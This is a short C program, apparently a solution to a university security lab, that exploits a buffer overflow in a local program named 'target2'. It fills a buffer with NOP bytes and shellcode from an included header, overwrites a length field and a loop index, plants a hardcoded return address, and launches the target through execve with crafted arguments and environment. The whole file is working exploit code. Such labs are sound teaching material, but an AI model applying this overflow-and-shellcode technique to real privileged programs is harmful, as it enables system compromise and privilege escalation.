#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"

int
main ( int argc, char * argv[] )
{
	const char NOP = '\x90';
	const char TERMINATOR = '\0';

	const int CHAR_BYTE = 1;
	const int INT_BYTES = 4;

	const int OVERWRITE_I = 0x0000010f;
	const int OVERWRITE_LEN = 0x0000011b;

	const int PC_ADDRESS = 0x3021fe98;
	const int RETURN_ADDRESS = 0x3021fd80;

	const int ADDRESS_OFFSET = PC_ADDRESS - RETURN_ADDRESS;
	const int BUFFER_LENGTH = ADDRESS_OFFSET + INT_BYTES + CHAR_BYTE;
	
	char *	args[3];
	char *	env[3];

	char buf[BUFFER_LENGTH];

	memset(buf, NOP, BUFFER_LENGTH);

	memcpy(buf, shellcode, strlen(shellcode));

	memcpy(buf + 264, &OVERWRITE_LEN, INT_BYTES);

	memcpy(buf + 268, &OVERWRITE_I, CHAR_BYTE);

	memcpy(buf + ADDRESS_OFFSET, &RETURN_ADDRESS, INT_BYTES);

	buf[BUFFER_LENGTH - 1] = TERMINATOR;

	args[0] = TARGET;
	args[1] = buf;
	args[2] = NULL;

	env[0] = &buf[267];
	env[1] = &buf[268];
	env[2] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
